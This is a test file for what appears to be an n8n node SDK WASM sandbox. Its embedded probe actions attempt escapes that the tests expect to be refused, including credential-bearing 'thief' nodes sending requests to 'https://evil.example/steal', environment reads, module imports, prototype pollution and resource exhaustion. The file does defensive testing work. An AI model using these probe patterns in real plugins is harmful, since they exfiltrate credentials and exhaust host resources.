import { existsSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import path from 'node:path';
import type { IHttpRequestOptions, INode } from 'n8n-workflow';

import { compat } from '../credentials';
import { freezeAction } from '../freeze';
import { sandboxedVersionOf, type SandboxOptions } from '../sandbox';
import type { ExecutorHost } from '../runtime';

const SANDBOX = path.resolve(__dirname, '..', '..', 'sandbox');
const SIDECAR = path.join(SANDBOX, 'sidecar', 'target', 'release', 'n8n-sandbox');
const GUEST = path.join(SANDBOX, 'dist', 'guest.wasm');

const node: INode = {
	id: '1',
	name: 'Probe',
	type: 'probe',
	typeVersion: 1,
	position: [0, 0],
	parameters: {},
};

const PROBES = (port: number) => `import { compat, credential, defineNode, obj, str } from '@n8n/node-sdk';
const probe = defineNode({ id: 'probe', displayName: 'Probe' });
const slackApi = compat('slackApi', { hosts: ['evil.example'] });
const thief = defineNode({
	id: 'thief',
	displayName: 'Thief',
	credential: credential({ types: [slackApi] }),
});
const baseThief = defineNode({
	id: 'baseThief',
	displayName: 'Base Thief',
	baseUrl: 'https://evil.example',
	credential: credential({ types: [slackApi] }),
});
const spec = (run: (context: any) => Promise<unknown>, extra: Record<string, unknown> = {}, node: any = probe) =>
	node.action('probe', {
		action: 'Probe',
		summary: 'Probe the sandbox.',
		flow: { effect: 'read', cardinality: 'per-item' },
		input: {},
		output: obj({ value: str() }),
		...extra,
		run,
	} as any);
const canary = 'http://127.0.0.1:${port}/';
export const fetchProbe = spec(async () => ({ value: String(await fetch(canary)) }));
export const processProbe = spec(async () => ({ value: String((globalThis as any).process.env.SANDBOX_CANARY) }));
export const importProbe = spec(async () => ({ value: String(await import('node:fs')) }));
export const timerProbe = spec(async ({ http }) => {
	setTimeout(() => void http.request({ url: canary }), 0);
	return { value: 'scheduled' };
});
export const loopProbe = spec(async () => {
	for (;;) {}
});
export const memoryProbe = spec(async () => {
	const kept: unknown[] = [];
	for (;;) kept.push(new Array(1_000_000).fill(kept.length));
});
export const undeclaredProbe = spec(async (context) => ({
	value: String(await context.dataTables.open({ name: 'secrets' })),
}));
export const egressProbe = spec(
	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
	{ egress: { hosts: ['api.example.com'] } },
);
export const noEgressProbe = spec(async ({ http }) => ({
	value: String(await http.request({ url: 'https://api.example.com/steal' })),
}));
export const credentialHostProbe = spec(
	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
	{ egress: { hosts: ['evil.example'] } },
	thief,
);
export const baseUrlProbe = spec(async ({ http }) => ({ value: String(await http.request({ path: '/steal' })) }), {}, baseThief);
export const pollutionProbe = spec(async () => {
	(Object.prototype as any).polluted = 'yes';
	return { value: String(({} as any).polluted) };
});
export const randomProbe = spec(async () => ({
	value: [Math.random(), crypto.getRandomValues(new Uint32Array(2)).join('-'), crypto.randomUUID()].join(' '),
}));
export const echoProbe = spec(async ({ http }) => ({
	value: JSON.stringify(await http.request({ url: 'https://api.example.com/echo', fullResponse: true })),
}), { egress: { hosts: ['api.example.com'] } });
`;

const PROBE_NAMES = [
	'fetchProbe',
	'processProbe',
	'importProbe',
	'timerProbe',
	'loopProbe',
	'memoryProbe',
	'undeclaredProbe',
	'egressProbe',
	'noEgressProbe',
	'credentialHostProbe',
	'baseUrlProbe',
	'pollutionProbe',
	'randomProbe',
	'echoProbe',
] as const;

type ProbeName = (typeof PROBE_NAMES)[number];

describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () => {
	const dirs = { root: '' };
	const canary = { hits: 0, server: undefined as Server | undefined };
	const requests: IHttpRequestOptions[] = [];
	const options = (): SandboxOptions => ({
		sidecar: SIDECAR,
		guest: GUEST,
		cacheDir: path.join(dirs.root, 'cache'),
		credentialType: (name) =>
			name === 'slackApi'
				? compat('slackApi', { hosts: ['slack.com'], baseUrl: 'https://slack.com/api' })
				: undefined,
		limits: { cpuMs: 1_000, memoryMb: 64, wallMs: 20_000 },
	});

	const hostOf = (): ExecutorHost => ({
		items: [{ json: {} }],
		node: { ...node, credentials: { slackApi: { id: '1', name: 'Slack' } } },
		parameter: () => undefined,
		request: async (request) => {
			requests.push(request);
			return { body: { z: 1, a: 2 }, headers: { 'X-Echo': '1' }, statusCode: 200 };
		},
		continueOnFail: () => false,
	});

	const run = async (name: ProbeName) => {
		const frozen = await freezeAction(path.join(dirs.root, 'probes.ts'), name);
		const { executor } = await sandboxedVersionOf(
			{ manifest: frozen.manifest, readBundle: async () => frozen.bundle },
			options(),
		);
		const [[output] = []] = await executor(hostOf());
		return output?.json.value;
	};

	beforeAll(async () => {
		dirs.root = await mkdtemp(path.join(tmpdir(), 'node-sdk-sandbox-'));
		canary.server = createServer((_request, response) => {
			canary.hits += 1;
			response.end('reached');
		});
		await new Promise<void>((resolve) => canary.server?.listen(0, '127.0.0.1', resolve));
		const { port } = canary.server.address() as AddressInfo;
		await writeFile(path.join(dirs.root, 'probes.ts'), PROBES(port));
		process.env.SANDBOX_CANARY = 'secret';
	});

	afterAll(async () => {
		delete process.env.SANDBOX_CANARY;
		await new Promise((resolve) => canary.server?.close(resolve));
		await rm(dirs.root, { recursive: true, force: true });
	});

	beforeEach(() => {
		requests.length = 0;
		canary.hits = 0;
	});

	it('gives the bundle no global fetch', async () => {
		await expect(run('fetchProbe')).rejects.toThrow('fetch is not available in the sandbox');
		expect(canary.hits).toBe(0);
	});

	it('gives the bundle no process and no environment', async () => {
		await expect(run('processProbe')).rejects.toThrow('globalThis.process is undefined');
	});

	it('stops a bundle that imports a module', async () => {
		await expect(run('importProbe')).rejects.toThrow('The bundle stopped the JS engine');
	});

	it('gives the bundle no timers, so nothing runs after the run', async () => {
		await expect(run('timerProbe')).rejects.toThrow('setTimeout is not available in the sandbox');
		expect(requests).toEqual([]);
		expect(canary.hits).toBe(0);
	});

	it('stops an endless loop at the CPU limit', async () => {
		const started = Date.now();
		await expect(run('loopProbe')).rejects.toThrow(
			'The bundle used its CPU time of 1000 ms and was stopped',
		);
		expect(Date.now() - started).toBeLessThan(10_000);
	});

	it('stops a memory blow-up at the memory limit', async () => {
		await expect(run('memoryProbe')).rejects.toThrow(
			'The bundle reached its memory limit of 64 MB and was stopped',
		);
	});

	it('refuses an import that the manifest does not grant, before the host sees it', async () => {
		await expect(run('undeclaredProbe')).rejects.toThrow(
			'The bundle called data-tables.open, which its manifest does not grant',
		);
	});

	it('refuses a request outside the egress hosts in the host', async () => {
		await expect(run('egressProbe')).rejects.toThrow('evil.example');
		expect(requests).toEqual([]);
	});

	it('refuses every request of an action without egress and without a base URL', async () => {
		await expect(run('noEgressProbe')).rejects.toThrow(
			'Host not allowed: probe.probe may send requests to no host, not to api.example.com',
		);
		expect(requests).toEqual([]);
	});

	it('takes the credential hosts from the host, not from the bundle', async () => {
		await expect(run('credentialHostProbe')).rejects.toThrow('evil.example');
		expect(requests).toEqual([]);
	});

	it('refuses a bundle that names a base URL outside its egress and credential hosts', async () => {
		await expect(run('baseUrlProbe')).rejects.toThrow(
			'names the base URL https://evil.example. Its host is not an egress host or a credential host',
		);
		expect(requests).toEqual([]);
	});

	it('keeps a change of the guest realm out of the host', async () => {
		await expect(run('pollutionProbe')).resolves.toBe('yes');
		expect(({} as Record<string, unknown>).polluted).toBeUndefined();
	});

	it('gives each run its own random values', async () => {
		const [first, second] = [await run('randomProbe'), await run('randomProbe')];
		expect(first).not.toBe(second);
	});

	it('sends a request through the host and gives the full response in its key order', async () => {
		await expect(run('echoProbe')).resolves.toBe(
			JSON.stringify({ body: { z: 1, a: 2 }, headers: { 'x-echo': '1' }, statusCode: 200 }),
		);
		expect(requests).toEqual([
			expect.objectContaining({ method: 'GET', url: 'https://api.example.com/echo' }),
		]);
	});
});
